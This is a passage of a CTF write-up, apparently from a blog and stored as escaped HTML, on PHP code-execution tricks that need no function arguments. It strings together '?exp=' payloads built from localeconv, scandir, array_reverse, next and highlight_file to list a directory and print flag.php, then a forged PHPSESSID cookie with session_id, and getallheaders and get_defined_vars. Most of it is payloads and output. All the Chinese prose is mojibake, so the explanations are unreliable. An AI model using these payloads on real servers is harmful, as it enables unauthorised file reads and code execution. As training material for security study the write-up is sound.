class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;grouping&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123; &amp;#125; [&lt;span class=&#34;string&#34;&gt;&amp;quot;mon_grouping&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//payload = 		?exp=var_dump(current(localeconv()));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//output  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	С╣Ітљј№╝їжђџУ┐Є scandir () У┐ћтЏътйЊтЅЇуЏ«тйЋСИГуџёТЅђТюЅТќЄС╗ХтњїуЏ«тйЋуџётѕЌУАе№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//paylaod			?exp=var_dump(scandir(current(localeconv())));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//output:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;#123; [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;..&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;.git&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тѕџтЦй№╝їУ┐ЎСИфжбўуЏ«уеЇтЙ«тЄЉтиДС║є№╝їflag ТќЄС╗ХтѕџтЦйтюетђњТЋ░уггС║їСИфТќЄС╗ХСИГ№╝їтЏаТГцтЈ»С╗ЦСй┐уће array_reverse () ТЮЦтЈЇУйгУ┐ЎСИфТЋ░у╗ё№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//paylaod			?exp=var_dump(array_reverse(scandir(current(localeconv()))));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//output:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;#123; [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;.git&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;..&amp;quot;&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	С╣Ітљј№╝їжђџУ┐Є next () ТЮЦТЊЇСйюТїЄжњѕ№╝їТїЄтљЉ flag ТќЄС╗Х№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//paylaod			?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//output:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	С╣Ітљјт░▒тЈ»С╗ЦжђџУ┐Є highlight_file () ТЮЦУ»╗тЈќ flag ТќЄС╗ХуџётєЁт«╣С║є&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//paylaod			?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//output:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;NSSCTF&amp;#123;fe7192e9-edcb-4217-9bcf-220940f8c20d&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;2session_id&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2session_id&#34;&gt;#&lt;/a&gt; 2.session_id()&lt;/h1&gt;
&lt;p&gt;РђІ	Сй┐ућеТЮАС╗Х№╝џтйЊУ»иТ▒ѓтц┤СИГТюЅ cookie ТЌХ№╝ѕТѕќУђЁУх░ТіЋТЌаУи»ТЅІтіеТи╗тіа cookie тц┤С╣ЪУАї№╝їТюЅС║Џ CTF жбўСИЇС╝џтЇА№╝Ѕ&lt;/p&gt;
&lt;p&gt;РђІ	ждќтЁѕТѕЉС╗гжюђУдЂт╝ђтљ» session_start () ТЮЦС┐ЮУ»Ђ session_id () уџёСй┐уће№╝їsession_id тЈ»С╗ЦућеТЮЦУјитЈќтйЊтЅЇС╝џУ»Ю ID№╝їС╣Ът░▒Тў»У»┤т«ЃтЈ»С╗ЦТіЊтЈќ PHPSESSID тљјжЮбуџёСИюУЦ┐№╝їСйєТў» phpsession СИЇтЁЂУ«И () тЄ║уј░&lt;br&gt;
РђІ	тюе burp СИГ№╝їТъёжђаСИђСИф payload СИ║№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?exp=&lt;span class=&#34;title function_ invoke__&#34;&gt;readfile&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;session_id&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;session_start&lt;/span&gt;()));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	жџЈтљј№╝їт░є Cookie Тћ╣СИ║№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PHPSESSID=flag.php &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	ТюђтљјТѕљтіЪУ»╗тЈќтѕ░С║є flag ТќЄС╗Х&lt;/p&gt;
&lt;h1 id=&#34;3getallheaders&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3getallheaders&#34;&gt;#&lt;/a&gt; 3.getallheaders()&lt;/h1&gt;
&lt;p&gt;РђІ	getallheaders () У┐ћтЏътйЊтЅЇУ»иТ▒ѓуџёТЅђТюЅУ»иТ▒ѓтц┤С┐АТЂ»№╝їт▒ђжЎљС║ј Apache№╝ѕapache_request_headers () тњї getallheaders () тіЪУЃйуЏИС╝╝№╝їтЈ»С║њуЏИТЏ┐С╗Б№╝їСИЇУ┐ЄС╣ЪТў»т▒ђжЎљС║ј Apache№╝Ѕ&lt;/p&gt;
&lt;p&gt;РђІ	тйЊуА«т«џУЃйтцЪУ┐ћтЏъТЌХ№╝їТѕЉС╗гт░▒УЃйтюеТЋ░ТЇ«тїЁТюђтљјСИђУАїтіаСИіСИђСИфУ»иТ▒ѓтц┤№╝їтєЎтЁЦТЂХТёЈС╗БуаЂ№╝їтєЇуће end () тЄйТЋ░ТїЄтљЉТюђтљјСИђСИфУ»иТ▒ѓтц┤№╝їСй┐тЁХТЅДУАї№╝їpayload№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?exp=&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;end&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;getallheaders&lt;/span&gt;()));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	СИЇУ┐Є№╝їУ┐ЎСИфжбўуЏ«ТѕЉућеУ┐ЎСИфТќ╣Т│ЋуџёТЌХтђЎтц▒У┤ЦС║є№╝їтЏаСИ║уггСИЅт▒ѓу╗ЋУ┐ЄУ┐ЄТ╗цС║є et№╝їуёХтљј get тЇЋУ»ЇтГўтюеУбФУ┐ЄТ╗цтЇЋУ»Ї№╝їТЌаТ│Ћу╗ЋУ┐Є№╝їТЅђС╗ЦућеСИђСИІтѕФС║║уџётЏЙуЅЄ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/8c3f2e46a74540bca932fdbf51cbb0e9.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4get_defined_vars&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4get_defined_vars&#34;&gt;#&lt;/a&gt; 4.get_defined_vars()&lt;/h1&gt;
&lt;p&gt;РђІ	уЏИУЙЃС║ј getallheaders№╝ѕ№╝ЅТЏ┤тіатЁиТюЅТЎ«жЂЇТђД№╝їт«ЃтЈ»С╗ЦтЏъТўЙтЁет▒ђтЈўжЄЈ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;сђЂ&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GETсђЂ&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;РђІ&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;сђЂ&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_POSTсђЂ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mtext&gt;сђЂ&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_FILESсђЂ&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;РђІ&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;сђЂ&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_COOKIE№╝ї&lt;/p&gt;
&lt;p&gt;У┐ћтЏъТЋ░у╗ёжА║т║ЈСИ║&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mo&gt;Рѕњ&lt;/mo&gt;&lt;mo&gt;Рѕњ&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET--&amp;gt;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;РђІ&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;Рѕњ&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;Рѕњ&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_POSTРђЊ&amp;gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mo&gt;Рѕњ&lt;/mo&gt;&lt;mo&gt;Рѕњ&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_COOKIE--&amp;gt;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;РђІ&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;Рѕњ&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span 